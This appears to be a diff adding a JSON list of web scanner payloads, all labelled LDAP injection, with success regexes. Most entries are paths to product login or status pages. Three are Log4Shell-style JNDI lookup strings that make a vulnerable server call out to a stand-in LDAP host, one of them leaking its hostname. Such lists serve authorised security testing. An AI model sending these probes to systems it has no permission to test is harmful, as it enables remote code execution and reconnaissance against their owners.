@@ -1,0 +1,255 @@
+[
+  {
+    "payload_id": "OWP-405380",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/status.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ldap|naming|exception"
+    }
+  },
+  {
+    "payload_id": "OWP-405381",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/glpi/status.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ldap|naming|exception"
+    }
+  },
+  {
+    "payload_id": "OWP-405382",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/glpi2/status.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ldap|naming|exception"
+    }
+  },
+  {
+    "payload_id": "OWP-406067",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/templates/config/profmanage.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ldap|naming|exception"
+    }
+  },
+  {
+    "payload_id": "OWP-406915",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/druid/coordinator/v1/lookups/config/$%7bjndi:ldap:%2f%2fexample.invalid%2ftea%7d",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ldap|naming|exception"
+    }
+  },
+  {
+    "payload_id": "OWP-406944",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/ccmadmin/showHome.do",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ldap|naming|exception"
+    }
+  },
+  {
+    "payload_id": "OWP-406945",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/orion/login?siteurl=meet&rnd=0.1359184728177283",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ldap|naming|exception"
+    }
+  },
+  {
+    "payload_id": "OWP-406951",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/c42api/v3/LoginConfiguration?username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.example.invalid/test}&url=https://localhost",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ldap|naming|exception"
+    }
+  },
+  {
+    "payload_id": "OWP-407111",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/mifs/user/login.jsp",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ldap|naming|exception"
+    }
+  },
+  {
+    "payload_id": "OWP-407112",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/mifs/user/login.jsp?error=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ldap|naming|exception"
+    }
+  },
+  {
+    "payload_id": "OWP-407153",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/Citrix/XenApp/auth/login.aspx?CTX_MessageType=WARNING&CTX_MessageKey=NoUsableClientDetected",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ldap|naming|exception"
+    }
+  },
+  {
+    "payload_id": "OWP-407189",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/flexnet/logon.do",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ldap|naming|exception"
+    }
+  },
+  {
+    "payload_id": "OWP-407191",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/fpc/app/login",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ldap|naming|exception"
+    }
+  },
+  {
+    "payload_id": "OWP-407196",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/goanywhere/auth/Login.xhtml",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ldap|naming|exception"
+    }
+  },
+  {
+    "payload_id": "OWP-407231",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/app/management/ingest/pipelines/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ldap|naming|exception"
+    }
+  },
+  {
+    "payload_id": "OWP-407240",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/configurations",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ldap|naming|exception"
+    }
+  },
+  {
+    "payload_id": "OWP-407271",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/opennms/login.jsp",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ldap|naming|exception"
+    }
+  },
+  {
+    "payload_id": "OWP-407310",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/user/error",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ldap|naming|exception"
+    }
+  },
+  {
+    "payload_id": "OWP-407354",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/console/apps/sepm",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ldap|naming|exception"
+    }
+  },
+  {
+    "payload_id": "OWP-407379",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/dr/authentication/oauth2/oauth2login?error=$%7Bjndi%3Aldap%3A%2F%2F$%7B%3A-{{rand1}}%7D$%7B%3A-{{rand2}}%7D.$%7BhostName%7D.uri.example.invalid%7D",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ldap|naming|exception"
+    }
+  },
+  {
+    "payload_id": "OWP-407391",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/zdm/login_xdm_uc.jsp",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ldap|naming|exception"
+    }
+  },
+  {
+    "payload_id": "OWP-407447",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/login.jsp?login_error=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ldap|naming|exception"
+    }
+  },
+  {
+    "payload_id": "OWP-407451",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/ui/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ldap|naming|exception"
+    }
+  }
+]
